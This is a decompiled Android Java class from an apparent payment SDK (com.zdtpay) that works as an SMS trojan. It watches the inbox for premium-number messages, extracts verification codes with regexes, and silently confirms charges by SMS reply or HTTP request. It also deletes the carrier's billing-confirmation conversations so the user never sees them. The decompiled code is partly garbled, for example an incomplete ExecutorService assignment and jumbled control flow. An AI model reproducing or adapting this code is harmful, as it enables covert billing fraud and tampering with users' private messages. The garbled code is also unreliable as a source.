package com.zdtpay;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.Message;
import android.telephony.SmsManager;
import com.duowan.mobile.netroid.RequestQueue;
import com.duowan.mobile.netroid.b.a;
import com.zdtpay.a.b;
import com.zdtpay.tools.MyLogPrinter;
import com.zdtpay.tools.c;
import java.io.PrintStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Iterator;
import java.util.LinkedHashSet;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicLong;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class k
  extends ContentObserver
{
  private static ExecutorService j = ;
  Iterator a;
  AtomicLong b = new AtomicLong(0L);
  String c = "SENT_SMS_ACTION_inbox";
  String d = "DELIVERED_SMS_ACTION_inbox";
  private Context e;
  private Handler f;
  private ArrayList g;
  private LinkedHashSet h = new LinkedHashSet();
  private SharedPreferences i;
  private String[] k = { "[中国移动和阅读]密码设置成功", "新密码为：abcd1234", "登录wap.cmread.com享受随身阅读乐趣", "业务提供商", "0.01元" };
  private BroadcastReceiver l = new l(this);
  private BroadcastReceiver m = new m(this);
  
  public k(Context paramContext, Handler paramHandler, ArrayList paramArrayList)
  {
    super(paramHandler);
    this.f = paramHandler;
    this.e = paramContext;
    this.g = paramArrayList;
    this.i = paramContext.getSharedPreferences("mysp", 0);
    int n = 0;
    if (n >= paramArrayList.size())
    {
      this.a = this.h.iterator();
      return;
    }
    paramContext = (b)paramArrayList.get(n);
    this.h.add(paramContext.m());
    label199:
    int i1;
    if (paramContext.h().size() > 0)
    {
      this.h.add(paramContext.i());
      paramContext = paramContext.h().iterator();
      if (paramContext.hasNext()) {}
    }
    else
    {
      paramContext = ((b)paramArrayList.get(n)).n();
      i1 = 0;
    }
    for (;;)
    {
      if (i1 >= paramContext.size())
      {
        n += 1;
        break;
        paramHandler = (String)paramContext.next();
        if ((paramHandler == null) || (paramHandler.length() <= 0)) {
          break label199;
        }
        this.h.add(paramHandler);
        break label199;
      }
      paramHandler = new StringBuffer((String)paramContext.get(i1));
      if (paramHandler.toString().contains("*")) {
        paramHandler.deleteCharAt(paramHandler.length() - 1);
      }
      this.h.add(paramHandler.toString());
      i1 += 1;
    }
  }
  
  private void a()
  {
    Cursor localCursor = this.e.getContentResolver().query(Uri.parse("content://sms/inbox"), new String[] { "_id", "body", "read", "thread_id", "address" }, " address like ? or read=?", new String[] { "%10658%", "0" }, "date desc");
    String str;
    int n;
    if ((localCursor != null) && (localCursor.getCount() > 0))
    {
      localCursor.moveToFirst();
      str = localCursor.getString(1);
      n = 0;
    }
    for (;;)
    {
      if (n >= this.k.length)
      {
        if (!localCursor.isClosed()) {
          localCursor.close();
        }
        return;
      }
      if (str.contains(this.k[n]))
      {
        int i1 = this.e.getContentResolver().delete(Uri.parse("content://sms/conversations/" + localCursor.getLong(3)), null, null);
        Message localMessage = this.f.obtainMessage();
        localMessage.obj = ("key " + i1 + " " + str);
        this.f.sendMessage(localMessage);
        System.out.println("SmsObserver.checkKeyForOne()   delete");
      }
      n += 1;
    }
  }
  
  private void b()
  {
    if ((this.a == null) || (!this.a.hasNext()))
    {
      this.a = this.h.iterator();
      MyLogPrinter.a("SmsObserver.checkKey()");
      return;
    }
    Object localObject1 = (String)this.a.next();
    MyLogPrinter.a("SmsObserver." + (String)localObject1);
    Object localObject2 = this.e.getContentResolver();
    Object localObject3 = Uri.parse("content://sms/inbox");
    Object localObject4 = "%" + (String)localObject1 + "%";
    localObject3 = ((ContentResolver)localObject2).query((Uri)localObject3, new String[] { "_id", "body", "read", "thread_id", "address", "date" }, " address like ? or read=?", new String[] { localObject4, "0" }, "date desc");
    int n = 0;
    Object localObject5;
    Object localObject6;
    for (;;)
    {
      if (n >= this.g.size()) {
        localObject2 = null;
      }
      do
      {
        if ((localObject3 == null) || (localObject2 == null)) {
          break label1334;
        }
        n = ((Cursor)localObject3).getCount();
        localObject5 = ((b)localObject2).d();
        if (n <= 0) {
          break label1334;
        }
        ((Cursor)localObject3).moveToFirst();
        n = ((Cursor)localObject3).getInt(2);
        long l1 = ((Cursor)localObject3).getLong(5);
        localObject1 = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss E").format(new Date(l1));
        localObject6 = ((Cursor)localObject3).getString(1);
        if (n != 1) {
          break label410;
        }
        MyLogPrinter.a("read:" + (String)localObject6);
        MyLogPrinter.a("time:" + (String)localObject1);
        if (((Cursor)localObject3).isClosed()) {
          break;
        }
        ((Cursor)localObject3).close();
        break;
        localObject2 = (b)this.g.get(n);
      } while ((!((b)localObject2).m().equals(localObject1)) && (!((b)localObject2).h().contains(localObject1)) && (((b)localObject2).i().equals(localObject1)));
      n += 1;
    }
    label410:
    localObject1 = ((Cursor)localObject3).getString(4);
    localObject4 = new ContentValues();
    ((ContentValues)localObject4).put("read", "1");
    this.e.getContentResolver().update(Uri.parse("content://sms/inbox"), (ContentValues)localObject4, " _id=?", new String[] { ((Cursor)localObject3).getInt(0) });
    int i1;
    label512:
    label524:
    label545:
    label657:
    Object localObject7;
    if ((((b)localObject2).n() != null) && (((b)localObject2).n().size() > 0))
    {
      i1 = 0;
      n = 0;
      if (n >= ((b)localObject2).n().size())
      {
        if (((b)localObject2).h().size() <= 0) {
          break label1205;
        }
        localObject4 = ((b)localObject2).h().iterator();
        if (((Iterator)localObject4).hasNext()) {
          break label657;
        }
        n = 0;
      }
      for (;;)
      {
        if (n != 0)
        {
          if (this.i.getBoolean(((b)localObject2).k() + "_ec", false))
          {
            if (((Cursor)localObject3).isClosed()) {
              break;
            }
            ((Cursor)localObject3).close();
            break;
            boolean bool = ((String)localObject6).contains((CharSequence)((b)localObject2).n().get(n));
            i1 = bool;
            if (bool) {
              break label524;
            }
            n += 1;
            i1 = bool;
            break label512;
            localObject7 = (String)((Iterator)localObject4).next();
            if (!((String)localObject1).toString().contains((CharSequence)localObject7)) {
              break label545;
            }
            n = 1;
            continue;
          }
          localObject4 = ((b)localObject2).i();
          if (localObject4 != null)
          {
            localObject3 = localObject4;
            if (!((String)localObject4).equals("")) {}
          }
          else
          {
            localObject3 = localObject1;
          }
          localObject4 = ((b)localObject2).j();
          localObject7 = ((b)localObject2).g().split("<\\|>");
          localObject6 = Pattern.compile(localObject7[0]).matcher((CharSequence)localObject6);
          localObject1 = localObject4;
          if (localObject7.length > 0)
          {
            MyLogPrinter.a("yzm   正则   --------" + localObject7[0]);
            localObject1 = localObject4;
            label789:
            if (((Matcher)localObject6).find()) {}
          }
          else
          {
            if ((((b)localObject2).f() == null) || (((b)localObject2).f().equals(""))) {
              break label1354;
            }
            localObject1 = ((b)localObject2).f() + (String)localObject1;
          }
        }
      }
    }
    label1205:
    label1334:
    label1354:
    for (;;)
    {
      if ((((b)localObject2).e() == null) || ("".equals(((b)localObject2).e())))
      {
        this.e.registerReceiver(this.l, new IntentFilter(this.c));
        localObject4 = new Intent(this.c);
        ((Intent)localObject4).putExtra(c.t, (String)localObject5);
        localObject4 = PendingIntent.getBroadcast(this.e, ((String)localObject5).hashCode(), (Intent)localObject4, 134217728);
        this.e.registerReceiver(this.m, new IntentFilter(this.d));
        localObject6 = new Intent(this.d);
        ((Intent)localObject6).putExtra(c.t, (String)localObject5);
        localObject5 = PendingIntent.getBroadcast(this.e, ((String)localObject5).hashCode(), (Intent)localObject6, 134217728);
        SmsManager.getDefault().sendTextMessage((String)localObject3, null, (String)localObject1, (PendingIntent)localObject4, (PendingIntent)localObject5);
      }
      for (;;)
      {
        this.i.edit().putBoolean(((b)localObject2).k() + "_ec", true).commit();
        break;
        if (!"".equals(((Matcher)localObject6).group()))
        {
          localObject1 = ((Matcher)localObject6).group();
          localObject4 = Pattern.compile(localObject7[1]).matcher((CharSequence)localObject1);
          for (;;)
          {
            if (!((Matcher)localObject4).find())
            {
              MyLogPrinter.a("yzm   messsage   --------" + (String)localObject1);
              break;
            }
            localObject1 = ((Matcher)localObject4).group();
          }
        }
        localObject1 = ((b)localObject2).j();
        break label789;
        localObject1 = ((b)localObject2).e() + (String)localObject1;
        f.b(this.e).a(new a(0, (String)localObject1, new o(this)));
      }
      if ((i1 != 0) && (((b)localObject2).o().equals("1")))
      {
        n = this.e.getContentResolver().delete(Uri.parse("content://sms/conversations/" + ((Cursor)localObject3).getLong(3)), null, null);
        localObject1 = this.f.obtainMessage();
        ((Message)localObject1).obj = ("key " + n + " " + (String)localObject6);
        this.f.sendMessage((Message)localObject1);
        if (((Cursor)localObject3).isClosed()) {
          break;
        }
        ((Cursor)localObject3).close();
        break;
      }
      if (((Cursor)localObject3).isClosed()) {
        break;
      }
      ((Cursor)localObject3).close();
      break;
    }
  }
  
  public void onChange(boolean paramBoolean)
  {
    if (paramBoolean) {
      return;
    }
    j.execute(new n(this));
  }
}
